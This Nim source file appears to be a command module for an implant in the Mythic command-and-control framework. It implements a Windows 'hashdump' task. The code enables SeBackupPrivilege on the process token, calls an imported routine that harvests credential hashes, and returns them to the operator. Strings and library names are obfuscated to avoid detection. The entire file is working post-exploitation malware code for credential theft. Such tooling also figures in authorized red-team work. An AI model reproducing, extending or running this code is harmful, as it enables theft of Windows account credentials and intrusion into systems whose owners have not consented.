import ../utils/m_responses
import ../utils/debug
import ../utils/strenc
import std/[json, strformat]

when defined(windows):
  import winim/lean
  import ../utils/hashdump_harvest

  const
    TOKEN_ADJUST_PRIVILEGES = 0x0020
    TOKEN_QUERY = 0x0008
    SE_PRIVILEGE_ENABLED = 0x00000002

  type
    LuidHashdump = object
      LowPart: DWORD
      HighPart: LONG

    LuidAndAttributesHashdump = object
      Luid: LuidHashdump
      Attributes: DWORD

    TokenPrivilegesHashdump = object
      PrivilegeCount: DWORD
      Privileges: array[1, LuidAndAttributesHashdump]

  proc LookupPrivilegeValueA(lpSystemName: LPCSTR, lpName: LPCSTR, lpLuid: ptr LuidHashdump): WINBOOL
    {.importc, dynlib: obf("advapi32.dll"), stdcall.}

  proc AdjustTokenPrivileges(TokenHandle: HANDLE, DisableAllPrivileges: WINBOOL,
                             NewState: ptr TokenPrivilegesHashdump, BufferLength: DWORD,
                             PreviousState: pointer, ReturnLength: ptr DWORD): WINBOOL
    {.importc, dynlib: obf("advapi32.dll"), stdcall.}

  proc enableSeBackupPrivilege(): bool =
    var hToken: HANDLE = 0
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hToken) == 0:
      return false
    var luid: LuidHashdump
    let privName = obf("SeBackupPrivilege")
    if LookupPrivilegeValueA(nil, privName.cstring, addr luid) == 0:
      CloseHandle(hToken)
      return false
    var tp = TokenPrivilegesHashdump(
      PrivilegeCount: 1,
      Privileges: [LuidAndAttributesHashdump(Luid: luid, Attributes: SE_PRIVILEGE_ENABLED)]
    )
    let ok = AdjustTokenPrivileges(hToken, 0, addr tp, DWORD(sizeof(TokenPrivilegesHashdump)), nil, nil) != 0
    let assigned = GetLastError() != 1300'u32  # ERROR_NOT_ALL_ASSIGNED
    CloseHandle(hToken)
    ok and assigned

proc hashdump*(taskId: string, params: JsonNode): JsonNode =
  when defined(windows):
    try:
      debug "[DEBUG] hashdump: starting"
      if not enableSeBackupPrivilege():
        return mythicError(taskId, obf("hashdump requires elevated Administrator with SeBackupPrivilege"))
      let payload = collectHashdumpData()
      return mythicSuccess(taskId, $payload)
    except ValueError as e:
      return mythicError(taskId, obf("hashdump failed: ") & e.msg)
    except CatchableError as e:
      return mythicError(taskId, obf("hashdump error: ") & e.msg)
  else:
    return mythicError(taskId, obf("hashdump command is only available on Windows"))
